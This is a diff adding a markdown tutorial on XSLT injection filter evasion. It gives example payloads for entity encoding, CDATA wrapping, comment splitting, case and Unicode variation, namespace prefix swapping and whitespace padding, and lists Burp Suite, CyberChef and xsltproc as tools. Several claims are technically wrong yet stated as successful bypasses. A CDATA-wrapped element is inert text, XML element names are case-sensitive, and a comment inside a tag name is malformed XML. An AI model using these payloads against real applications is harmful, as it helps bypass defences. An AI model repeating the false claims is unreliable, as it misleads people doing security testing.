@@ -1,0 +1,109 @@
+---
+title: 'XSLT Injection: Evasion Techniques Unveiled'
+description: Master XSLT evasion techniques to bypass filters and detection in XML
+  processing.
+keywords:
+- XSLT evasion
+- filter bypass
+- XML encoding
+- obfuscation
+- namespace pollution
+- input validation bypass
+- XML injection techniques
+- CDATA evasion
+- whitespace manipulation
+---
+
+# Evasion Techniques
+
+## Context
+
+This article aims to teach practical evasion techniques for bypassing input filters and detection mechanisms through XSLT injection. Knowledge of XSLT processing logic, XML structure and syntax, common XSLT functions, and basic XSLT injection exploitation is assumed.
+
+## Theory
+
+### XSLT Filter Bypass Fundamentals
+
+Evasion techniques can manipulate XSLT payloads to bypass input validation or detection mechanisms. Filters often leverage pattern matching, case sensitivity, or rely on naive parsing, all of which can be targeted for bypass opportunities.
+
+### Encoding and Obfuscation Strategies
+
+Filters may not decode or normalize XML entities, Unicode, or encoded payloads before applying validation mechanisms. By creatively obfuscating XSLT keywords or utilizing alternate encodings, attackers can evade signature-based detection methods.
+
+### Structural Manipulation in XSLT Payloads
+
+Injections involving CDATA sections, comments, whitespace, or case variations can help evade filters. Many implementations mishandle namespaces or XML structure, allowing malicious XSLT to execute despite present filtering mechanisms.
+
+## Practice
+
+### Bypassing Filters with XML Entity Encoding
+
+- **Obfuscated Payload:**
+  
+  ```xml
+  <xsl:value-of select="&#99;&#111;&#110;&#99;&#97;&#116;&#40;&#39;A&#39;,&#39;B&#39;&#41;"/>
+  ```
+
+  By obfuscating the 'concat' function using XML numeric character references, the payload is designed to bypass keyword-based filtering. The injection is successful, allowing execution despite input validation.
+
+### Obfuscating XSLT with CDATA Sections
+
+- **CDATA Payload:**
+  
+  ```xml
+  <![CDATA[<xsl:value-of select="system-property('os.name')"/>]]>
+  ```
+
+  This technique encapsulates the payload within a CDATA section to conceal it from XML or XSLT keyword filters. The outcome is a successful bypass of input validation due to improper parsing of the CDATA content by some filters.
+
+### Comment Injection for Keyword Splitting
+
+- **Splitting Keywords with Comments:**
+  
+  ```xml
+  <xsl:value-<!-- -->of select="system-property('os.name')"/>
+  ```
+
+  By injecting an XML comment to divide the keyword 'value-of,' the evasion tactic avoids detection by filters that rely on contiguous keyword patterns.
+
+### Unicode and Case Manipulation
+
+- **Case Variation Payload:**
+  
+  ```xml
+  <xsl:VALue-OF select="system-property('os.name')"/>
+  ```
+
+- **Unicode Encoding Payload:**
+
+  ```xml
+  <xsl:value-of select="syst&#101;m-property('os.name')"/>
+  ```
+
+  Utilize variations in letter casing or introduce Unicode or entity encoding for partial obfuscation. Such manipulations exploit filters that lack comprehensive normalization routines.
+
+### Namespace Pollution for Filter Evasion
+
+- **Custom Namespace Payload:**
+  
+  ```xml
+  <foo:value-of xmlns:foo="http://www.w3.org/1999/XSL/Transform" select="system-property('os.name')"/>
+  ```
+
+  This method uses an alternate namespace prefix, pretending as a legitimate XSLT structure. If the engine resolves custom namespaces, this approach effectively bypasses filters that target standard prefixes like 'xsl:'.
+
+### Whitespace and Formatting Manipulation
+
+- **Whitespace Manipulation Payload:**
+
+  ```xml
+  <xsl:value-of    select = "system-property('os.name')"/>
+  ```
+
+  Adding excessive whitespace aims to defeat simple regex or string-based filters that do not account for flexible whitespace within or around elements.
+
+## Tools
+
+- **Burp Suite**
+- **CyberChef**
+- **xsltproc**
